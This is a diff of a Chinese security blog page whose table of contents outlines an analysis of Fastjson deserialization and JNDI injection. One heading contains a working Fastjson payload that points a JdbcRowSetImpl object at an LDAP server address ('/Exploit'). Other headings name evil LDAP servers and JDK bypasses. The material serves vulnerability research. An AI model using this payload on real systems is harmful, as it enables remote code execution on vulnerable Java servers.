@@ -6,25 +6,49 @@
   <meta name="keywords" content=" Hexo , Markdown ">
   <meta name="description" content="Java反序列化-Fastjson漏洞全分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Fastjson不出网利用0x01 Teamplates   0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource2.1 利⽤条件 ⽆需⽬标额外开启选项，也不⽤连接外部服务器 但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar 对于SpringBoot这种⾃带Tomcat可以直接以单个ja">
+<meta name="description" content="inxedu_cms前言   因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。 第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java反序列化-Fastjson不出网利用">
-<meta property="og:url" content="http://example.com/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:title" content="java代码审计-inxedu">
+<meta property="og:url" content="http://example.com/2021/12/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-inxedu/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="Fastjson不出网利用0x01 Teamplates   0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource2.1 利⽤条件 ⽆需⽬标额外开启选项，也不⽤连接外部服务器 但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar 对于SpringBoot这种⾃带Tomcat可以直接以单个ja">
+<meta property="og:description" content="inxedu_cms前言   因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。 第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101406330.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101721116.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101843513.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101905153.png">
-<meta property="article:published_time" content="2021-12-18T14:00:12.000Z">
-<meta property="article:modified_time" content="2021-12-24T02:48:28.280Z">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212114439.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172113.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172023.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212111938.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227220501041.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227220603447.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211227220632818.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213173933.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174226.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174750.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174304.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121827.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213122138.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213175257.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213180316.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121211.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121225.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212122514.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182040.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182147.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182225.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213115840.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185228.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185425.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185436.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212133339.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183058.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183308.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183430.png">
+<meta property="article:published_time" content="2021-12-20T06:12:12.000Z">
+<meta property="article:modified_time" content="2021-12-27T14:07:24.557Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png">
+<meta name="twitter:image" content="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212114439.png">
 
 
 <link rel="icon" href="/img/1.jpg">
@@ -238,7 +262,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(25)</small>
+                <small>(28)</small>
             
         </div>
     </li>
@@ -288,10 +312,24 @@
         
             
                 <li>
-                    <div data-rel="java代码审计">
+                    <div data-rel="java安全">
                         
-                        java代码审计
+                        java安全
                         <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Java安全">
+                        
+                        Java安全
+                        <small>(7)</small>
                         
                     </div>
                     
@@ -305,7 +343,7 @@
                     <div data-rel="JAVA代码审计">
                         
                         JAVA代码审计
-                        <small>(9)</small>
+                        <small>(10)</small>
                         
                     </div>
                     
@@ -316,10 +354,10 @@
         
             
                 <li>
-                    <div data-rel="Java反序列化">
+                    <div data-rel="SAST自动代码审计">
                         
-                        Java反序列化
-                        <small>(7)</small>
+                        SAST自动代码审计
+                        <small>(1)</small>
                         
                     </div>
                     
@@ -361,8 +399,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="25">
-<input type="hidden" id="yelog_site_word_count" value="49.4k">
+<input type="hidden" id="yelog_site_posts_number" value="28">
+<input type="hidden" id="yelog_site_word_count" value="53.5k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -422,7 +460,15 @@
     
     <nav id="title-list-nav">
         
-        <a  class="All Java反序列化 "
+        <a  class="All JAVA代码审计 "
+           href="/2021/12/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-inxedu/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="java代码审计-inxedu">java代码审计-inxedu</span>
+            <span class="post-date" title="2021-12-20 14:12:12">2021/12/20</span>
+        </a>
+        
+        <a  class="All Java安全 "
            href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -430,15 +476,7 @@
             <span class="post-date" title="2021-12-18 22:00:12">2021/12/18</span>
         </a>
         
-        <a  class="All Java反序列化 "
-           href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90%20-%20%E5%89%AF%E6%9C%AC/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="Java反序列化-Fastjson漏洞全分析">Java反序列化-Fastjson漏洞全分析</span>
-            <span class="post-date" title="2021-12-18 18:00:12">2021/12/18</span>
-        </a>
-        
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
            href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -446,7 +484,15 @@
             <span class="post-date" title="2021-12-18 18:00:12">2021/12/18</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All "
+           href="/2021/12/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title=""></span>
+            <span class="post-date" title="2021-12-14 16:18:52">2021/12/14</span>
+        </a>
+        
+        <a  class="All Java安全 "
            href="/2021/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -454,7 +500,7 @@
             <span class="post-date" title="2021-12-08 18:00:12">2021/12/08</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
            href="/2021/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -462,7 +508,15 @@
             <span class="post-date" title="2021-12-08 18:00:12">2021/12/08</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
+           href="/2021/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%86%85%E5%AD%98%E9%A9%AC/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="Java反序列化-内存马">Java反序列化-内存马</span>
+            <span class="post-date" title="2021-12-08 18:00:12">2021/12/08</span>
+        </a>
+        
+        <a  class="All Java安全 "
            href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -470,7 +524,7 @@
             <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All Java安全 "
            href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -542,6 +596,14 @@
             <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
         </a>
         
+        <a  class="All SAST自动代码审计 "
+           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-codeql%E5%88%86Datagear/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="SAST自动代码审计-Codeql分析Datagear">SAST自动代码审计-Codeql分析Datagear</span>
+            <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
+        </a>
+        
         <a  class="All JAVA代码审计 "
            href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%8A%A5%E9%94%992/"
            data-tag="Hexo,Markdown"
@@ -558,7 +620,7 @@
             <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
         </a>
         
-        <a  class="All java代码审计 "
+        <a  class="All java安全 "
            href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Apache-Log4j/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -583,10 +645,10 @@
         </a>
         
         <a  class="All JAVA代码审计 "
-           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%B0%84/"
+           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java%E9%9D%A2%E5%AF%B9%E5%AF%B9%E8%B1%A1/"
            data-tag="Hexo,Markdown"
            data-author="" >
-            <span class="post-title" title="java代码审计-编程语法">java代码审计-编程语法</span>
+            <span class="post-title" title="java代码审计-面对对">java代码审计-面对对</span>
             <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
         </a>
         
@@ -652,7 +714,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Java反序列化">Java反序列化</a>
+            <a  data-rel="Java安全">Java安全</a>
             
         </span>
         
@@ -669,12 +731,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-24 15:20:18'>2021-12-18 18:00</time>
+            Created At : <time class="date" title='Updated At: 2022-01-11 18:45:24'>2021-12-18 18:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:5.8k</span>
+        <span>Count:7.5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -704,7 +766,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-text">JNDI注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readObject%E6%94%BB%E5%87%BBRMI"><span class="toc-text">readObject攻击RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-JNDI-RMI"><span class="toc-text">0x01 JNDI+RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JNDI-LDAP"><span class="toc-text">0x02 JNDI+LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8-Bypass-%E9%AB%98%E7%89%88%E6%9C%AC-JDK-%E9%99%90%E5%88%B6"><span class="toc-text">0x03 JNDI 注入利用 Bypass 高版本 JDK 限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Bypass1%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96Payload%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget"><span class="toc-text">3.1 Bypass1：返回序列化Payload，触发本地Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Evil-LDAP-Server"><span class="toc-text">Evil LDAP Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Victim-Client"><span class="toc-text">Victim Client</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Bypass-2%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory"><span class="toc-text">3.2  Bypass 2：利用本地Class作为Reference Factory</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Fastjson1-2-24-JDNI%E6%B3%A8%E5%85%A5"><span class="toc-text">0x04 Fastjson1.2.24 + JDNI注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Fastjson1-2-25%E6%94%B9%E5%8A%A8"><span class="toc-text">0x05 Fastjson1.2.25改动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Fastjson-1-2-41%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x06 Fastjson 1.2.41版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Fastjson-1-2-42%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x07 Fastjson 1.2.42版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x08 Fastjson 1.2.47漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9A1-2-33-1-2-47%E7%89%88%E6%9C%AC%EF%BC%9A%E6%97%A0%E8%AE%BA%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AFAutoTypeSupport%EF%BC%8C%E9%83%BD%E8%83%BD%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8"><span class="toc-text">第一种情况：1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-java-lang-Class-quot-quot-val-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot"><span class="toc-text">分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot-quot-dataSourceName-quot-quot-ldap-192-168-52-132-1389-Exploit-quot-quot-autoCommit-quot-true"><span class="toc-text">分析第二个json字符串{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.52.132:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9A1-2-25-1-2-32%E7%89%88%E6%9C%AC%EF%BC%9A%E6%9C%AA%E5%BC%80%E5%90%AFAutoTypeSupport%E6%97%B6%E8%83%BD%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8"><span class="toc-text">第二种情况：1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-1-2-48%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-text">0x09 1.2.48补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-fastjson-1-2-68-%E7%BB%95%E8%BF%87autotype"><span class="toc-text">0x10 fastjson 1.2.68 绕过autotype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-dnslog%E5%88%A4%E6%96%AD%E5%90%8E%E7%AB%AF%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson"><span class="toc-text">0x11 dnslog判断后端是否使用fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93"><span class="toc-text">简单总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90"><span class="toc-text">JNDI注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference%E7%B1%BB"><span class="toc-text">Reference类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-JNDI-RMI"><span class="toc-text">0x01 JNDI+RMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JNDI-LDAP"><span class="toc-text">0x02 JNDI+LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8-Bypass-%E9%AB%98%E7%89%88%E6%9C%AC-JDK-%E9%99%90%E5%88%B6"><span class="toc-text">0x03 JNDI 注入利用 Bypass 高版本 JDK 限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-text">3.1前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Bypass1%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96Payload%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget"><span class="toc-text">3.2 Bypass1：返回序列化Payload，触发本地Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Bypass-2%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory"><span class="toc-text">3.3  Bypass 2：利用本地Class作为Reference Factory</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Fastjson1-2-24-JDNI%E6%B3%A8%E5%85%A5"><span class="toc-text">0x04 Fastjson1.2.24 + JDNI注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Fastjson1-2-25%E6%94%B9%E5%8A%A8"><span class="toc-text">0x05 Fastjson1.2.25改动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Fastjson-1-2-41%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x06 Fastjson 1.2.41版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Fastjson-1-2-42%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x07 Fastjson 1.2.42版本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x08 Fastjson 1.2.47漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9A1-2-33-1-2-47%E7%89%88%E6%9C%AC%EF%BC%9A%E6%97%A0%E8%AE%BA%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AFAutoTypeSupport%EF%BC%8C%E9%83%BD%E8%83%BD%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8"><span class="toc-text">第一种情况：1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-java-lang-Class-quot-quot-val-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot"><span class="toc-text">分析第一个json字符串{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E4%B8%AAjson%E5%AD%97%E7%AC%A6%E4%B8%B2-quot-type-quot-quot-com-sun-rowset-JdbcRowSetImpl-quot-quot-dataSourceName-quot-quot-ldap-192-168-52-132-1389-Exploit-quot-quot-autoCommit-quot-true"><span class="toc-text">分析第二个json字符串{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.52.132:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9A1-2-25-1-2-32%E7%89%88%E6%9C%AC%EF%BC%9A%E6%9C%AA%E5%BC%80%E5%90%AFAutoTypeSupport%E6%97%B6%E8%83%BD%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8"><span class="toc-text">第二种情况：1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-1-2-48%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-text">0x09 